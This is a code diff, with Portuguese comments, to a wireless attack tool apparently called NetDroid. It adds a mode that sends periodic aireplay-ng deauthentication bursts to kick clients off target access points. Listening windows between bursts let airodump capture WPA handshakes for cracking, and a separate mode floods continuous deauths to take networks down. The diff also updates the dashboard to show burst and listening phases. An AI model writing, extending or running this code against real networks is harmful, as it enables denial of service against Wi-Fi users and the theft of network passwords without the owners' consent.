@@ -114,7 +114,7 @@ except Exception:
     HAS_REPORTLAB = False
 
 # ═══════════════════════ CONSTANTS ════════════════════════════
-VERSION = "1.5.9"
+VERSION = "1.6.0"
 GITHUB_REPO = "yamotoz/NetDroid"
 GITHUB_BRANCHES = ("master", "main")  # tenta master 1º (default atual), main como fallback
 GITHUB_RAW_TEMPLATE = "https://raw.githubusercontent.com/{repo}/{branch}/{path}"
@@ -187,6 +187,8 @@ CARROSSEL_SLOT_VERMELHA_S = 15       # tempo por canal quando só há APs em ver
 CARROSSEL_SLOT_AZUL_S = 10           # tempo por canal quando há APs em azul (handshake)
 CARROSSEL_AIRODUMP_BOOT_S = 1.5      # pausa entre airodump up e aireplay bursts
 CARROSSEL_AZUL_FLUSH_S = 1.5         # pausa pós-slot pro airodump flushar cap antes da validação
+CARROSSEL_AZUL_BURST_PKTS = 30       # deauths por burst em zona azul (kicka cliente)
+CARROSSEL_AZUL_LISTEN_S = 8          # janela de escuta entre bursts (cliente reconecta)
 AZUL_DIR = HANDSHAKE_DIR / "azul"    # 1 pasta por BSSID com handshake.cap+22000
 SLOT_TEMP_DIR = HANDSHAKE_DIR / "_slot_temp"  # caps temp do carrossel (deletados)
 
@@ -6081,15 +6083,37 @@ class CarrosselCanal:
                 p_dump = None
                 cap_file = None
 
-        # v1.5.8: SIMPLIFICAÇÃO CIRÚRGICA — vermelha e azul são mutuamente
-        # exclusivas (decisão do usuário), então grupo terá APENAS uma das
-        # duas zonas populada. Comportamento idêntico em ambos casos:
-        # aireplay-ng --deauth 0 contínuo + airodump escutando, pelo slot
-        # inteiro. Sem early-stop, sem listen-extra. Espelho da vermelha.
+        # v1.6.0: COMPORTAMENTO DIFERENCIADO POR ZONA
+        # Vermelha = derrubar = aireplay --deauth 0 contínuo (Popen background)
+        # Azul = capturar = bursts periódicos com janela de escuta (subprocess.run)
+        # Razão: cliente PRECISA de tempo silencioso pra reconectar e completar
+        # o 4-way handshake. Deauth contínuo impede a reconexão.
         procs: List[Tuple[str, subprocess.Popen, str]] = []
         aps_alvo = grupo["vermelha"] + grupo["azul"]
         zona_corrente = "azul" if grupo["azul"] else ("vermelha" if grupo["vermelha"] else "")
-        if HAS_AIREPLAY:
+
+        # Inicialização das métricas + status azul
+        if zona_corrente == "azul":
+            for ap in aps_alvo:
+                ap["carrossel_ciclos"] = ap.get("carrossel_ciclos", 0) + 1
+                ap["carrossel_tempo_acumulado_s"] = (
+                    ap.get("carrossel_tempo_acumulado_s", 0) + slot_s
+                )
+                ap["crack"] = {
+                    "status": "capturing",
+                    "progresso": 0.0,
+                    "eta": "?",
+                    "tentativa": ap["carrossel_ciclos"],
+                    "tempo_acumulado_s": ap["carrossel_tempo_acumulado_s"],
+                }
+                emitir("ap_update", **ap)
+                try: emitir("handshake_log", bssid=ap["bssid"],
+                              msg=f"▶ ciclo #{ap['carrossel_ciclos']} ch{canal} · "
+                                    f"burst pattern ({CARROSSEL_AZUL_BURST_PKTS}pkts/{CARROSSEL_AZUL_LISTEN_S}s)")
+                except Exception: pass
+
+        # Vermelha: spawn aireplay --deauth 0 contínuo (Popen) — fica firing
+        if zona_corrente == "vermelha" and HAS_AIREPLAY:
             for ap in aps_alvo:
                 bssid = ap["bssid"]
                 try:
@@ -6099,53 +6123,83 @@ class CarrosselCanal:
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                     )
-                    procs.append((bssid, p, zona_corrente))
-                    # Métrica per-AP de tentativas (azul) — ciclos + tempo acumulado
-                    if zona_corrente == "azul":
-                        ap["carrossel_ciclos"] = ap.get("carrossel_ciclos", 0) + 1
-                        ap["carrossel_tempo_acumulado_s"] = (
-                            ap.get("carrossel_tempo_acumulado_s", 0) + slot_s
-                        )
-                        ap["crack"] = {
-                            "status": "capturing",
-                            "progresso": 0.0,
-                            "eta": "?",
-                            "tentativa": ap["carrossel_ciclos"],
-                            "tempo_acumulado_s": ap["carrossel_tempo_acumulado_s"],
-                        }
-                        emitir("ap_update", **ap)
-                        try: emitir("handshake_log", bssid=bssid,
-                                      msg=f"▶ ciclo #{ap['carrossel_ciclos']} ch{canal} "
-                                            f"aireplay --deauth 0 + airodump ON ({slot_s}s)")
-                        except Exception: pass
+                    procs.append((bssid, p, "vermelha"))
                 except Exception as e:
                     eng.ui.warn(f"  aireplay {bssid} falhou: {e}")
 
         inicio = time.time()
+        # Azul: state pra burst-listen pattern
+        proxima_burst_em_s = 0.0       # primeiro burst em t=0
+        burst_count_azul = 0
+        burst_intervalo = float(CARROSSEL_AZUL_LISTEN_S + 1)  # +1s pro burst rodar
+
         while time.time() - inicio < slot_s:
             if self.stop_event.is_set():
                 break
             elapsed = time.time() - inicio
             restante = max(0, slot_s - int(elapsed))
 
+            # Azul: dispara burst quando a janela de escuta termina
+            if zona_corrente == "azul" and HAS_AIREPLAY and elapsed >= proxima_burst_em_s:
+                burst_count_azul += 1
+                eng.ui.info(f"  💥 ch{canal} burst #{burst_count_azul} "
+                              f"({CARROSSEL_AZUL_BURST_PKTS} deauths) → "
+                              f"escutando {CARROSSEL_AZUL_LISTEN_S}s")
+                for ap in aps_alvo:
+                    bssid = ap["bssid"]
+                    try:
+                        # Burst FINITO síncrono (~1s) — kick + retorna
+                        subprocess.run(
+                            ["aireplay-ng", "-0", str(CARROSSEL_AZUL_BURST_PKTS),
+                             "--ignore-negative-one", "-a", bssid, iface],
+                            timeout=5,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                        )
+                        with eng.contador_lock:
+                            eng.contador_global += CARROSSEL_AZUL_BURST_PKTS
+                            eng.contador_por_bssid[bssid] = (
+                                eng.contador_por_bssid.get(bssid, 0)
+                                + CARROSSEL_AZUL_BURST_PKTS
+                            )
+                    except Exception:
+                        pass
+                proxima_burst_em_s = elapsed + burst_intervalo
+                try:
+                    for ap in aps_alvo:
+                        emitir("handshake_log", bssid=ap["bssid"],
+                                msg=f"💥 burst #{burst_count_azul} disparado · escuta {CARROSSEL_AZUL_LISTEN_S}s ON")
+                except Exception: pass
+
+            # Contadores vermelha (~64/s por aireplay vivo)
             for bssid, p, _zona in procs:
                 if p.poll() is not None:
                     continue
                 with eng.contador_lock:
                     eng.contador_global += 64
                     eng.contador_por_bssid[bssid] = eng.contador_por_bssid.get(bssid, 0) + 64
+
             try:
                 with self.lock:
                     pendentes = list(self.canais_pendentes)
                 emitir("carrossel_tick", canal=canal, restante_s=restante,
-                        slot_s=slot_s, ativo=True, canais_pendentes=pendentes)
+                        slot_s=slot_s, ativo=True, canais_pendentes=pendentes,
+                        zona_corrente=zona_corrente,
+                        burst_count=burst_count_azul if zona_corrente == "azul" else None)
             except Exception:
                 pass
+
             for ap in aps_alvo:
                 ap["pacotes"] = eng.contador_por_bssid.get(ap["bssid"], 0)
                 ap["carrossel_canal"] = canal
                 ap["carrossel_slot_restante"] = restante
+                if zona_corrente == "azul":
+                    ap["azul_burst_count"] = burst_count_azul
+                    # Indicador "fase atual": disparando burst ou escutando
+                    fase = "burst" if elapsed < (proxima_burst_em_s - CARROSSEL_AZUL_LISTEN_S) else "escutando"
+                    ap["azul_fase"] = fase
                 emitir("ap_update", **ap)
+
             if self.stop_event.wait(1.0):
                 break
 
@@ -8485,12 +8539,20 @@ function cardHTML(ap, zona){
       const tentativa = (ap.crack && ap.crack.tentativa) ? ap.crack.tentativa : (ap.carrossel_ciclos || 0);
       const tempoAcumulado = (ap.crack && ap.crack.tempo_acumulado_s) ? ap.crack.tempo_acumulado_s : (ap.carrossel_tempo_acumulado_s || 0);
       const tempoLabel = tempoAcumulado >= 60 ? `${Math.floor(tempoAcumulado/60)}min ${tempoAcumulado%60}s` : `${tempoAcumulado}s`;
-      const blocoTentativas = ((status === "capturing" || status === "queued_carrossel") && tentativa > 0) ? `
+      const burstCount = ap.azul_burst_count || 0;
+      const azulFase = ap.azul_fase || "";  // "burst" ou "escutando"
+      const faseIcon = azulFase === "burst" ? "💥" : (azulFase === "escutando" ? "👂" : "🎯");
+      const faseTexto = azulFase === "burst"
+        ? `disparando burst (kick clientes)`
+        : (azulFase === "escutando"
+            ? `🔊 escutando reconexão (cliente vai mandar EAPOL)`
+            : "preparando…");
+      const blocoTentativas = (status === "capturing" && tentativa > 0) ? `
         <div class="text-center mt-2 p-2 rounded border border-cyan-700/50 bg-cyan-950/30">
-          <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">🎯 capturando handshake</div>
+          <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">${faseIcon} capturando handshake</div>
           <div class="text-3xl font-black text-cyan-200 leading-tight" style="text-shadow:0 0 10px rgba(0,212,255,0.7);font-family:'JetBrains Mono',monospace">ciclo #${tentativa}</div>
-          <div class="text-[0.7rem] text-cyan-400 mt-1">⏱ ${tempoLabel} acumulados</div>
-          <div class="text-[0.65rem] text-gray-400 italic">aireplay --deauth 0 + airodump ON</div>
+          <div class="text-[0.7rem] text-cyan-400 mt-1">⏱ ${tempoLabel} acumulados · 💥 ${burstCount} bursts</div>
+          <div class="text-[0.65rem] text-gray-400 italic mt-0.5">${faseTexto}</div>
         </div>` : ((status === "queued_carrossel") ? `
         <div class="text-center mt-2 p-2 rounded border border-cyan-700/30 bg-cyan-950/20">
           <div class="text-[0.62rem] uppercase tracking-[0.2em] text-cyan-300 font-bold">⏳ aguardando slot</div>
